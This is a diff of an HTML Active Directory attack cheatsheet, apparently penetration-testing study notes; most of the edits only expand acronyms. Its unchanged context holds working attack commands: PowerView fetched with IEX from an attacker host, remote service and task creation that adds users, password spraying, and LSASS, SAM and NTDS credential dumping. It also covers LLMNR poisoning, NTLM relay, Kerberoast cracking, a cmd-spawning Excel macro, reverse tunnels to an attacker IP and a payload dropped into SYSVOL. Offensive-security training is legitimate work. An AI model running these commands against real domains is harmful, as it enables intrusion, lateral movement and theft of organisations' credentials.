@@ -243,24 +243,14 @@
       <div class="container cheatsheet-container">
         <div class="cheatsheet-content">
 <h2 id="cape-ldap-1">1. Active Directory LDAP</h2>
-<p>LDAP is Active Directory's query protocol. Every request begins with a bind, and any authenticated domain user has read access to almost the entire tree without additional privileges. The tree carries:</p>
-<ul>
-  <li>Users</li>
-  <li>Groups</li>
-  <li>Computers</li>
-  <li>OUs</li>
-  <li>GPO links</li>
-  <li>Certificate templates</li>
-  <li>Delegation flags</li>
-</ul>
-<p>That makes LDAP the single richest information source available from any credentialed host.</p>
+<p>LDAP (Lightweight Directory Access Protocol) is Active Directory's query protocol. Every request begins with a bind, and any authenticated domain user has read access to almost the entire tree without additional privileges. Inside that tree sit the domain's users, groups, and computers, along with the OUs (Organizational Units) that contain them, the GPO (Group Policy Object) links attached at each level, ADCS (Active Directory Certificate Services) certificate templates, and the delegation flags that decide which accounts can impersonate which. That makes LDAP the single richest information source available from any credentialed host.</p>
 
-<p>Bind mode determines the visibility of the query:</p>
+<p>Bind mode determines what the DC (Domain Controller) is willing to hand back:</p>
 <table class="custom-table">
 <thead><tr><th>Bind mode</th><th>What the DC returns</th><th>Typical use</th></tr></thead>
 <tbody>
 <tr><td><strong>Anonymous</strong></td><td>Root DSE only: naming contexts, supported controls, schema location</td><td>Zero-credential recon; enough metadata to shape the authenticated query that follows</td></tr>
-<tr><td><strong>Authenticated</strong></td><td>The full tree, scoped by base and object-class filter</td><td>Every real enumeration pass; sloppy base or filter returns the entire directory</td></tr>
+<tr><td><strong>Authenticated</strong></td><td>The full tree, scoped by base and object-class filter</td><td>Standard enumeration workflow once credentials are in hand. A broad base or missing filter still returns the whole directory.</td></tr>
 </tbody>
 </table>
 
@@ -273,7 +263,7 @@
 <tbody>
 <tr><td><code>-x</code></td><td>simple (anonymous) authentication</td></tr>
 <tr><td><code>-H</code></td><td>LDAP URI of the target DC</td></tr>
-<tr><td><code>-s base</code></td><td>search scope limited to the base DSE</td></tr>
+<tr><td><code>-s base</code></td><td>search scope limited to the base DSE (DSA-Specific Entry)</td></tr>
 </tbody>
 </table>
 <p>Look for <code>defaultNamingContext</code>, which becomes the <code>-b</code> value for every subsequent query.</p>
@@ -287,7 +277,7 @@
 <pre><code class="language-bash">ldapsearch -x -b "dc=htb,dc=local" -h &lt;IP&gt; -p 389 | grep -i -a 'Service Accounts'</code></pre>
 
 <h3 id="cape-ldap-authenticated-enumeration">1.3 Authenticated Enumeration</h3>
-<p>Authenticated binds unlock the vast majority of AD attributes. Provide the bind DN with <code>-D</code>, the password with <code>-w</code>, and set the base to the domain naming context:</p>
+<p>Authenticated binds unlock the vast majority of AD attributes. Provide the bind DN (Distinguished Name) with <code>-D</code>, the password with <code>-w</code>, and set the base to the domain naming context:</p>
 <pre><code class="language-bash">ldapsearch -H ldap://&lt;dc-fqdn&gt; -x -D '&lt;user&gt;@&lt;domain.local&gt;' -w '&lt;password&gt;' -b "DC=&lt;domain&gt;,DC=&lt;tld&gt;" "objectclass=user" sAMAccountName | grep sAMAccountName | awk -F":" '{print $2}'</code></pre>
 <p>The same call shape works for any object class. Swap the filter for <code>group</code>, <code>computer</code>, <code>msDS-GroupManagedServiceAccount</code>, or <code>pKICertificateTemplate</code> and keep going. The filter language itself is RFC 4515, and it deserves its own subsection below because you will lean on it every engagement.</p>
 
@@ -318,7 +308,7 @@
 (description=*password*)       # dangerous but often productive</code></pre>
 
 <h4 id="cape-ldap-filters-bitwise">1.4.3 Bitwise Filters</h4>
-<p><code>userAccountControl</code> is a bitfield packed into a single integer, so plain equality matching does not work. Individual bits are tested with the <code>LDAP_MATCHING_RULE_BIT_AND</code> extension (OID <code>1.2.840.113556.1.4.803</code>):</p>
+<p><code>userAccountControl</code> is a bitfield packed into a single integer, so plain equality matching does not work. Individual bits are tested with the <code>LDAP_MATCHING_RULE_BIT_AND</code> extension, referenced by its OID (Object Identifier) <code>1.2.840.113556.1.4.803</code>:</p>
 <pre><code class="language-bash">(userAccountControl:1.2.840.113556.1.4.803:=2)         # ACCOUNTDISABLE
 (userAccountControl:1.2.840.113556.1.4.803:=32)        # PASSWD_NOTREQD
 (userAccountControl:1.2.840.113556.1.4.803:=65536)     # DONT_EXPIRE_PASSWORD
@@ -331,7 +321,7 @@
 
 <h4 id="cape-ldap-filters-practical">1.4.5 Practical Combined Filters</h4>
 <p>The filters below cover the questions worth asking on almost every internal engagement.</p>
-<p>Kerberoastable users (user accounts with any SPN set):</p>
+<p>Kerberoastable users (user accounts with any SPN (Service Principal Name) set):</p>
 <pre><code class="language-bash">(&amp;(samAccountType=805306368)(servicePrincipalName=*))</code></pre>
 <p>AS-REP roastable users (pre-auth disabled):</p>
 <pre><code class="language-bash">(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code></pre>
@@ -362,7 +352,7 @@
 <h4 id="cape-ldap-anr">1.4.7 Ambiguous Name Resolution and PrimaryGroupID</h4>
 <p>Two AD-specific LDAP behaviours are worth committing to memory. Ambiguous Name Resolution (ANR) matches a single search value against a fixed list of attributes at once, including <code>givenName</code>, <code>sn</code>, <code>displayName</code>, <code>sAMAccountName</code>, and <code>proxyAddresses</code>. One query replaces a hand-written OR of half a dozen sub-filters:</p>
 <pre><code class="language-bash">ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; '(anr=admin)' sAMAccountName displayName</code></pre>
-<p><code>PrimaryGroupID</code> stores an account's primary group RID, and it does not appear in <code>memberOf</code>. Standard membership queries silently miss it, which is the reliable source of "how did that user still have access?" mysteries. Translate the RID into a group SID to resolve the primary group:</p>
+<p><code>PrimaryGroupID</code> stores an account's primary group RID (Relative Identifier), and it does not appear in <code>memberOf</code>. Standard membership queries silently miss it, which is the reliable source of "how did that user still have access?" mysteries. Translate the RID into a group SID (Security Identifier) to resolve the primary group:</p>
 <pre><code class="language-bash"># Pull the primary group RID from the account
 ldapsearch -x -b "dc=&lt;domain&gt;,dc=&lt;tld&gt;" -h &lt;dc-ip&gt; '(sAMAccountName=&lt;user&gt;)' primaryGroupID
 # 513 = Domain Users (default), 512 = Domain Admins, 515 = Domain Computers, 516 = Domain Controllers</code></pre>
@@ -375,7 +365,7 @@ windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&
 windapsearch -d &lt;domain.local&gt; --dc-ip &lt;dc-ip&gt; -u &lt;user&gt; -p '&lt;password&gt;' --gpos     # every GPO</code></pre>
 
 <h3 id="cape-ldap-rpcclient">1.5 rpcclient over MSRPC</h3>
-<p><code>rpcclient</code> talks Windows MSRPC to a DC over SMB. Sometimes it hands back things LDAP won't, and when LDAP is filtered it is the only game left. Both anonymous and authenticated modes work:</p>
+<p><code>rpcclient</code> talks Windows MSRPC (Microsoft Remote Procedure Call) to a DC over SMB (Server Message Block). Sometimes it hands back things LDAP won't, and when LDAP is filtered it is the only game left. Both anonymous and authenticated modes work:</p>
 <pre><code class="language-bash">rpcclient -U="" -N &lt;dc-ip&gt;
 rpcclient -U="<user>" &lt;dc-ip&gt;</code></pre>
 <p>Once connected, a handful of commands cover most enumeration needs:</p>
@@ -393,7 +383,7 @@ netshareenum            # SMB shares
 enumprivs               # user privileges</code></pre>
 
 <h3 id="cape-ldap-rid-brute">1.6 RID Brute Force</h3>
-<p>RIDs are the tail of every SID and get handed out sequentially, which is the whole reason RID-brute works. Even when username enumeration is locked down, asking SAMR "what's the name for RID 1000, 1001, 1002..." usually pulls the account list back out. NetExec (<code>nxc</code>) does it against SMB:</p>
+<p>RIDs are the tail of every SID and get handed out sequentially, which is the whole reason RID-brute works. Even when username enumeration is locked down, asking SAMR (the Security Account Manager Remote protocol) "what's the name for RID 1000, 1001, 1002..." usually pulls the account list back out. NetExec (<code>nxc</code>) does it against SMB:</p>
 <pre><code class="language-bash">crackmapexec smb <dc-ip> -u "" -p "" --rid-brute</code></pre>
 <p>Once a user list is built, spray a candidate password across every account. Consult the lockout policy first (from <code>getuserdompwinfo</code>): that number sets the ceiling on how aggressive the spray can be before accounts start locking out and the noise reaches the SOC.</p>
 <pre><code class="language-bash">crackmapexec smb <dc-ip> -u users.txt -p "password"</code></pre>
@@ -474,7 +464,7 @@ rpcclient $&gt; querydispinfo</code></pre>
 <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/PowerView.ps1')</code></pre>
 
 <h3 id="cape-powerview-domain-info">2.2 Domain and DC Information</h3>
-<p>PowerView's <code>Get-Net*</code> cmdlets wrap LDAP queries the AD-RSAT module also exposes, but they run under any domain user's context and do not require RSAT to be installed. Start with the DC and the current domain:</p>
+<p>PowerView's <code>Get-Net*</code> cmdlets wrap LDAP queries the AD-RSAT (Remote Server Administration Tools) module also exposes, but they run under any domain user's context and do not require RSAT to be installed. Start with the DC and the current domain:</p>
 <pre><code class="language-powershell">Get-NetDomainController
 Get-NetDomain</code></pre>
 <p>Enumerate active logon sessions and current interactive users on the DC or a specific workstation:</p>
@@ -531,7 +521,7 @@ Get-DomainDNSRecord -ZoneName '&lt;domain.local&gt;'</code></pre>
 <p><code>Find-ForeignGroup</code> and <code>Find-ForeignUser</code> surface principals from a trusted domain that hold membership in the current domain, the corresponding <code>foreignSecurityPrincipal</code> objects and every group that lists them:</p>
 <pre><code class="language-powershell">Find-ForeignGroup                          # Groups in the current domain with members from a trusted one
 Find-ForeignUser                           # Users from a trusted domain with membership here</code></pre>
-<p><code>Find-InterestingDomainAcl</code> is PowerView's shortcut for hunting abusable ACEs domain-wide. Filters out inherited noise and returns only ACEs likely to escalate:</p>
+<p><code>Find-InterestingDomainAcl</code> is PowerView's shortcut for hunting abusable ACEs (Access Control Entries) inside DACLs (Discretionary Access Control Lists) domain-wide. Filters out inherited noise and returns only ACEs likely to escalate:</p>
 <pre><code class="language-powershell">Find-InterestingDomainAcl -ResolveGUIDs
 Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq '&lt;controlled-user&gt;' }</code></pre>
 
@@ -549,7 +539,7 @@ Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceNam
 </ul>
 
 <h3 id="cape-powerview-sharpview">2.2.4 SharpView</h3>
-<p>SharpView is a C# port of PowerView. Same cmdlet names, same outputs, but ships as a single .NET binary that runs under execute-assembly from a C2 (Sliver, Cobalt Strike, Havoc) without dropping PowerShell:</p>
+<p>SharpView is a C# port of PowerView. Same cmdlet names, same outputs, but ships as a single .NET binary that runs under execute-assembly from a C2 (Command and Control) framework such as Sliver, Cobalt Strike, or Havoc without dropping PowerShell:</p>
 <pre><code class="language-bash">execute-assembly SharpView.exe Get-DomainUser -Identity &lt;user&gt;
 execute-assembly SharpView.exe Get-DomainComputer -Unconstrained</code></pre>
 
@@ -706,7 +696,7 @@ Get-DomainObjectAcl -Identity &lt;target-user&gt; -ResolveGUIDs</code></pre>
 <pre><code class="language-powershell"># GenericAll = full control over the object (reset password, add to group, write any attribute)
 Get-DomainObjectAcl -ResolveGUIDs |
     Where-Object { $_.ActiveDirectoryRights -match 'GenericAll' }</code></pre>
-<p>Principals that can write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a computer (RBCD attack surface):</p>
+<p>Principals that can write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a computer (the RBCD (Resource-Based Constrained Delegation) attack surface):</p>
 <pre><code class="language-powershell"># Writing this attribute lets the attacker configure Resource-Based Constrained Delegation on the target
 Get-DomainObjectAcl -ResolveGUIDs |
     Where-Object { $_.ObjectAceType -eq 'msDS-AllowedToActOnBehalfOfOtherIdentity' }</code></pre>
@@ -806,7 +796,7 @@ Powershell_execute Invoke-EnumerateLocalAdmin</code></pre>
 <p>Chain in <code>HostEnum.ps1</code> for local host reconnaissance from the same session:</p>
 <pre><code class="language-bash">powershell_import /root/Desktop/HostEnum.ps1
 powershell_shell Invoke-HostEnum -Local -Domain</code></pre>
-<p><code>HostRecon.ps1</code> from <a href="https://github.com/dafthack/HostRecon">dafthack/HostRecon</a> covers what egress ports, EDR products, and network filtering are in place:</p>
+<p><code>HostRecon.ps1</code> from <a href="https://github.com/dafthack/HostRecon">dafthack/HostRecon</a> covers what egress ports, EDR (Endpoint Detection and Response) products, and network filtering are in place:</p>
 <pre><code class="language-bash">powershell_import /root/Desktop/HostRecon.ps1
 powershell_execute Invoke-HostRecon</code></pre>
 
@@ -963,7 +953,7 @@ Bloodhound</code></pre>
 <pre><code class="language-bash">SharpHound.exe --CollectionMethods All --Domain &lt;domain.local&gt;
 SharpHound.exe --CollectionMethods DCOnly,CertServices --Domain &lt;domain.local&gt;   # quiet + ADCS
 SharpHound.exe --CollectionMethods Session,LoggedOn --Domain &lt;domain.local&gt;      # top up an old collection</code></pre>
-<p>The DCSync edges (<code>GetChanges</code> and <code>GetChangesAll</code>) come from ACL collection on the domain root. A principal holding both extended rights can perform DCSync directly:</p>
+<p>The DCSync (Directory Replication Service Sync) edges (<code>GetChanges</code> and <code>GetChangesAll</code>) come from ACL collection on the domain root. A principal holding both extended rights can perform DCSync directly:</p>
 <pre><code class="language-bash"># Every principal that can DCSync the domain
 MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 
@@ -1016,7 +1006,7 @@ MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 <tr><td><strong>WriteOwner</strong></td><td>take ownership of the object, then grant yourself further rights</td></tr>
 <tr><td><strong>WriteDACL</strong></td><td>modify the object's ACL to grant yourself GenericAll</td></tr>
 <tr><td><strong>AllExtendedRights</strong></td><td>extended rights include password reset and DCSync</td></tr>
-<tr><td><strong>ReadLAPSPassword</strong></td><td>read the local admin password managed by LAPS</td></tr>
+<tr><td><strong>ReadLAPSPassword</strong></td><td>read the local admin password managed by LAPS (Local Administrator Password Solution)</td></tr>
 </tbody>
 </table>
 
@@ -1031,7 +1021,7 @@ MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 <h3 id="cape-bloodhound-local-admins">3.7 Identifying Local Administrators</h3>
 <p>Cypher query for users who are local admin somewhere:</p>
 <pre><code class="language-bash">(u:User)-[:AdminTo]-&gt;(c:Computer)</code></pre>
-<p>Local admin means complete control of a machine: persistence, LSASS dumping, credential extraction. The reverse question, "who are the explicit admins on this box?", uses the Explicit Admins and Unrolled Admins node views.</p>
+<p>Local admin means complete control of a machine: persistence, LSASS (Local Security Authority Subsystem Service) dumping, credential extraction. The reverse question, "who are the explicit admins on this box?", uses the Explicit Admins and Unrolled Admins node views.</p>
 
 <h3 id="cape-bloodhound-active-sessions">3.8 Identifying Active Sessions</h3>
 <p>The <code>HasSession</code> edge shows which users are currently logged onto which hosts, invaluable for spotting exposed high-value tokens:</p>
@@ -1044,9 +1034,9 @@ MATCH p=(n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p</code></pre>
 <p>Track dangerous ACLs across the graph: <code>ForceChangePassword</code>, <code>AddMembers</code>, <code>GenericAll</code>, <code>GenericWrite</code>, <code>ReadLAPSPassword</code>.</p>
 
 <h3 id="cape-bloodhound-unconstrained-delegation">3.10 Unconstrained Delegation</h3>
-<p>Computers with unconstrained delegation cache the TGT of every user who authenticates to them. Compromise the box, extract the tickets, then impersonate any user in the domain. Domain Admins land in scope the moment I can coerce a DC into authenticating.</p>
+<p>Computers with unconstrained delegation cache the TGT (Ticket Granting Ticket) of every user who authenticates to them. Compromise the box, extract the tickets, then impersonate any user in the domain. Domain Admins land in scope the moment I can coerce a DC into authenticating.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/unconstrained-delegation-settings.png" alt="Computer account showing 'Trust this computer for delegation to any service' in ADUC" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
-<p>Constrained delegation is the safer cousin: the account can only impersonate to a specific set of listed SPNs. Even that gets abused when the SPN list includes something reachable and the S4U2Self / S4U2Proxy extensions are usable.</p>
+<p>Constrained delegation is the safer cousin: the account can only impersonate to a specific set of listed SPNs. Even that gets abused when the SPN list includes something reachable and the S4U2Self (Service-for-User-to-Self) / S4U2Proxy (Service-for-User-to-Proxy) extensions are usable.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/constrained-delegation-properties.png" alt="Account delegation tab showing constrained delegation with allowed SPNs" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">(c:Computer {UnconstrainedDelegation:true})</code></pre>
 <pre><code class="language-bash">(c:Computer {UnconstrainedDelegation:true})</code></pre>
@@ -1098,7 +1088,7 @@ RETURN p</code></pre>
 <tbody>
 <tr><td><strong>Targeted Kerberoasting via SPN</strong></td><td>write a bogus SPN, request a service ticket, crack offline, remove the SPN</td></tr>
 <tr><td><strong>Group membership</strong></td><td>add yourself to the target group directly</td></tr>
-<tr><td><strong>Shadow Credentials via computer objects</strong></td><td>write <code>msDS-KeyCredentialLink</code> to register a certificate that can authenticate via Kerberos PKINIT</td></tr>
+<tr><td><strong>Shadow Credentials via computer objects</strong></td><td>write <code>msDS-KeyCredentialLink</code> to register a certificate that can authenticate via Kerberos PKINIT (Public Key Cryptography for Initial Authentication)</td></tr>
 </tbody>
 </table>
 <p>Add a user directly to a group via net rpc (requires appropriate permissions on the target group):</p>
@@ -1165,7 +1155,7 @@ john --format=krb5tgs --wordlist=rockyou.txt hashes.txt</code></pre>
 <p>BloodHound makes ACL analysis tractable, with two caveats to remember:</p>
 <ul>
 <li>Scope is limited to ACLs directly abusable for object control, OU and GPO ACLs aren't fully ingested.</li>
-<li>Only "Allow" ACEs are considered. Effective access (as the SRM would compute in canonical order) isn't calculated.</li>
+<li>Only "Allow" ACEs are considered. Effective access (as the SRM (Security Reference Monitor) would compute in canonical order) isn't calculated.</li>
 </ul>
 
 <h3 id="cape-bloodhound-inbound-control">3.24 Understanding Inbound Object Control</h3>
@@ -1271,11 +1261,11 @@ SharpHound.exe --CollectionMethods All --Stealth --ExcludeDomainControllers</cod
 </ul>
 <h2 id="cape-lateral-movement-4">4. Windows Lateral Movement</h2>
 <p>Lateral movement is everything between the first foothold and the objective. Every technique in this module trades stealth for reliability differently, and the right choice depends on the sensor stack, the state of centralised logging, and whether the account you plan to reuse is expected to appear on the destination host in the first place.</p>
-<p>Two questions I ask before touching a target: what account material do I have (password, NTLM hash, Kerberos ticket, cert), and what remote execution channels does the target actually accept (WinRM, DCOM, SMB service creation, task scheduler). The intersection of those two sets is usually a much shorter list than it looks.</p>
+<p>Two questions I ask before touching a target: what account material do I have (password, NTLM (NT LAN Manager) hash, Kerberos ticket, cert), and what remote execution channels does the target actually accept (WinRM (Windows Remote Management), DCOM (Distributed Component Object Model), SMB service creation, task scheduler). The intersection of those two sets is usually a much shorter list than it looks.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/network-topology.png" alt="Lateral movement across a segmented network topology" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-lateral-psremoting">4.1 PowerShell Remoting</h3>
-<p>PSRemoting rides WinRM on TCP 5985 (HTTP) or 5986 (HTTPS). Prereqs: WinRM enabled on the target (<code>Enable-PSRemoting -Force</code>), valid credentials, and network access. In-domain use is smoothest with Kerberos; cross-domain expect NTLM or CredSSP.</p>
+<p>PSRemoting rides WinRM on TCP 5985 (HTTP) or 5986 (HTTPS). Prereqs: WinRM enabled on the target (<code>Enable-PSRemoting -Force</code>), valid credentials, and network access. In-domain use is smoothest with Kerberos; cross-domain expect NTLM or CredSSP (Credential Security Support Provider).</p>
 <p>One-off command execution with explicit credentials:</p>
 <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<domain.local>\&lt;user&gt;', $SecPassword)
@@ -1331,7 +1321,7 @@ Enter-PSSession -Computername TARGET -Credential $credential
 Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock { whoami }</code></pre>
 
 <h3 id="cape-lateral-sc">4.4 Service Management with sc.exe</h3>
-<p>Windows services run commands when they start. A service configured to run an arbitrary executable will still try to launch it and fail cleanly, which is fine for our purposes. Ports 135/TCP, 49152-65535/TCP (DCE/RPC), 445/TCP and 139/TCP (RPC-over-SMB). Requires Administrators membership on the target.</p>
+<p>Windows services run commands when they start. A service configured to run an arbitrary executable will still try to launch it and fail cleanly, which is fine for our purposes. Ports 135/TCP, 49152-65535/TCP (DCE/RPC, the Distributed Computing Environment / Remote Procedure Call range), 445/TCP and 139/TCP (RPC-over-SMB). Requires Administrators membership on the target.</p>
 <pre><code class="language-bash">sc.exe \\TARGET create evil binPath= "net user <user> <password> /add" start= auto
 sc.exe \\TARGET start evil
 sc.exe \\TARGET stop evil
@@ -1344,7 +1334,7 @@ schtasks /s TARGET /run /TN "evil"
 schtasks /S TARGET /TN "evil" /DELETE /F</code></pre>
 
 <h3 id="cape-lateral-wmi">4.6 WMI</h3>
-<p>WMI can spawn processes and manage services on remote hosts. Build a credential object once, then choose a transport:</p>
+<p>WMI (Windows Management Instrumentation) can spawn processes and manage services on remote hosts. Build a credential object once, then choose a transport:</p>
 <pre><code class="language-powershell">$username = 'Administrator'
 $password = '<password>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -1354,10 +1344,10 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 <thead><tr><th>Protocol</th><th>Transport</th></tr></thead>
 <tbody>
 <tr><td><strong>DCOM</strong></td><td>RPC over IP via ports 135/TCP and 49152-65535/TCP</td></tr>
-<tr><td><strong>WSMan</strong></td><td>WinRM (5985/5986)</td></tr>
+<tr><td><strong>WSMan</strong> (Web Services Management)</td><td>WinRM (5985/5986)</td></tr>
 </tbody>
 </table>
-<p>Open a CIM session over DCOM:</p>
+<p>Open a CIM (Common Information Model) session over DCOM:</p>
 <pre><code class="language-powershell">$Opt = New-CimSessionOption -Protocol DCOM
 $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop</code></pre>
 <p>Spawn a process remotely, output isn't captured, so this is a blind attack:</p>
@@ -1518,7 +1508,7 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 <pre><code class="language-bash">socat TCP4-LISTEN:80,fork TCP4:<attacker-ip>:80</code></pre>
 
 <h4 id="cape-lateral-socks">4.11.4 Dynamic Forwarding with SOCKS</h4>
-<p>Single-port forwarding doesn't scale, SOCKS proxies do. Since Windows machines rarely run SSH servers, the client-side SSH runs the tunnel:</p>
+<p>Single-port forwarding doesn't scale, SOCKS (Socket Secure) proxies do. Since Windows machines rarely run SSH servers, the client-side SSH runs the tunnel:</p>
 <pre><code class="language-bash">ssh tunneluser@<attacker-ip> -R 9050 -N</code></pre>
 <p>Configure proxychains to match in <code>/etc/proxychains.conf</code>:</p>
 <pre><code class="language-bash">[ProxyList]
@@ -1566,7 +1556,7 @@ Remove-PSSession $sess</code></pre>
   </li>
 </ul>
 <h2 id="cape-crackmapexec-5">5. Using CrackMapExec</h2>
-<p>CrackMapExec (CME), and its actively maintained fork NetExec (<code>nxc</code>), pack the most-used AD attack surfaces behind a single fast multi-target CLI. SMB, MSSQL, WinRM, LDAP, and RDP all live under the same tool. Where PowerView is what I reach for during enumeration and Impacket is what I use for surgical single-target work, CME is what I sweep a segment with when I need to know, in under a minute, which hosts are reachable, what signing looks like, and whose credentials still work.</p>
+<p>CrackMapExec (CME), and its actively maintained fork NetExec (<code>nxc</code>), pack the most-used AD attack surfaces behind a single fast multi-target CLI (Command Line Interface). SMB, MSSQL (Microsoft SQL Server), WinRM, LDAP, and RDP (Remote Desktop Protocol) all live under the same tool. Where PowerView is what I reach for during enumeration and Impacket is what I use for surgical single-target work, CME is what I sweep a segment with when I need to know, in under a minute, which hosts are reachable, what signing looks like, and whose credentials still work.</p>
 
 <h3 id="cape-cme-basic-usage">5.1 Basic Usage</h3>
 <p>CME's canonical form is <code>cme &lt;protocol&gt; &lt;target(s)&gt; [options]</code>. The target accepts a single IP, a CIDR range, or a file of hosts, and every protocol shares the same authentication flag set.</p>
@@ -1647,7 +1637,7 @@ crackmapexec smb &lt;target&gt; -u &lt;user&gt; -p '&lt;password&gt;' -M lsassy
 
 # nanodump: smaller, quieter minidump
 crackmapexec smb &lt;target&gt; -u &lt;user&gt; -p '&lt;password&gt;' -M nanodump</code></pre>
-<p>With local admin, dump credentials directly. LSA often contains cleartext DPAPI-decryptable secrets. NTDS is domain-wide and needs DC access.</p>
+<p>With local admin, dump credentials directly. LSA (Local Security Authority) often contains cleartext DPAPI (Data Protection API)-decryptable secrets. NTDS (the NT Directory Services database) is domain-wide and needs DC access.</p>
 <pre><code class="language-bash"># Local SAM (workstation local accounts)
 crackmapexec smb &lt;target&gt; -u &lt;user&gt; -p '&lt;password&gt;' --sam
 
@@ -1749,7 +1739,7 @@ crackmapexec ldap &lt;dc-fqdn&gt; -u &lt;user&gt; -k --use-kcache --users</code>
 </table>
 
 <h3 id="cape-cme-responder-integration">5.8 Responder Integration</h3>
-<p>Responder poisons LLMNR/NBT-NS/mDNS and captures NTLMv2 hashes when the SCF forces a lookup. Start it on the same interface:</p>
+<p>Responder poisons LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and mDNS (multicast DNS) traffic and captures NTLMv2 hashes when the SCF (Shell Command File) forces a lookup. Start it on the same interface:</p>
 <pre><code class="language-bash">sudo responder -I eth0 -dpV</code></pre>
 <p>The typical CME + Responder flow: run CME to plant slinky, wait for a user to browse the share, capture the hash, crack offline.</p>
 
@@ -1775,7 +1765,7 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
   </li>
 </ul>
 <h2 id="cape-kerberos-6">6. Kerberos Attacks</h2>
-<p>Kerberos replaced NTLM as the default in Windows domains and was supposed to close the credential-reuse door. It didn't. Pre-authentication is still crackable, service tickets are still cracked offline, delegation still gets abused, and if you own <code>krbtgt</code> you can forge whatever you want. Every attack in this list makes more sense once you have the six-step client &harr; KDC &harr; service exchange in your head, so start there.</p>
+<p>Kerberos replaced NTLM as the default in Windows domains and was supposed to close the credential-reuse door. It didn't. Pre-authentication is still crackable, service tickets are still cracked offline, delegation still gets abused, and if you own <code>krbtgt</code> you can forge whatever you want. Every attack in this list makes more sense once you have the six-step client &harr; KDC (Key Distribution Center) &harr; service exchange in your head, so start there.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/kerberos-auth-flow.png" alt="Kerberos authentication flow between client, KDC, and target service" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-kerberos-terminology">6.1 Common Terminology</h3>
@@ -1787,7 +1777,7 @@ python ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 <tr><td><strong>Authentication Service (AS)</strong></td><td>issues TGTs consumed by the TGS.</td></tr>
 <tr><td><strong>Ticket Granting Service (TGS)</strong></td><td>issues service tickets against a valid TGT.</td></tr>
 <tr><td><strong>Service Principal Name (SPN)</strong></td><td>an identifier that associates a service instance with a domain service account. A service must have an SPN to be Kerberos-authenticable.</td></tr>
-<tr><td><strong>KDC Long Term Secret Key (KDC LT Key)</strong></td><td>derived from the KRBTGT service account. Encrypts the TGT and signs the PAC.</td></tr>
+<tr><td><strong>KDC Long Term Secret Key (KDC LT Key)</strong></td><td>derived from the KRBTGT (Kerberos Ticket Granting Ticket) service account. Encrypts the TGT and signs the PAC.</td></tr>
 <tr><td><strong>Client Long Term Secret Key (Client LT Key)</strong></td><td>derived from the computer or service account. Used to encrypt the pre-auth timestamp and the session key.</td></tr>
 <tr><td><strong>Service Long Term Secret Key (Service LT Key)</strong></td><td>derived from the service account. Used to encrypt the service portion of the TGS and sign the PAC.</td></tr>
 <tr><td><strong>Session Key</strong></td><td>issued by the KDC alongside a TGT. Presented with the TGT when requesting a service ticket.</td></tr>
@@ -2270,7 +2260,7 @@ getTGT.py 'domain.local/user:pass'</code></pre>
 <p style="text-align:center;"><img src="/assets/images/cape/dcsync-replication-rights.png" alt="DCSync replication rights delegated in Active Directory" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-dacl2-dcom-excel">8.1 Exploiting AD with DCOM and Macro-Enabled Excel</h3>
-<p>Another artifact worth checking before any escalation attempt: legacy Group Policy Preferences (GPP) XML in SYSVOL. When it was still in fashion, admins would ship local account passwords through GPP, encrypted with a static key Microsoft later published. Any authenticated user could read the XML from SYSVOL and decrypt the <code>cpassword</code> field.</p>
+<p>Another artifact worth checking before any escalation attempt: legacy Group Policy Preferences (GPP) XML in SYSVOL (the System Volume share replicated between DCs). When it was still in fashion, admins would ship local account passwords through GPP, encrypted with a static key Microsoft later published. Any authenticated user could read the XML from SYSVOL and decrypt the <code>cpassword</code> field.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/gpp-cpassword-xml.png" alt="Groups.xml file in SYSVOL containing a cpassword field" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Requires admin on the compromised workstation. Craft an Excel file with a macro that spawns cmd.exe:</p>
 <pre><code class="language-vb">Sub AutoOpen()
@@ -2649,7 +2639,7 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 </ul>
 
 <h2 id="cape-adcs-9">9. ADCS Attacks</h2>
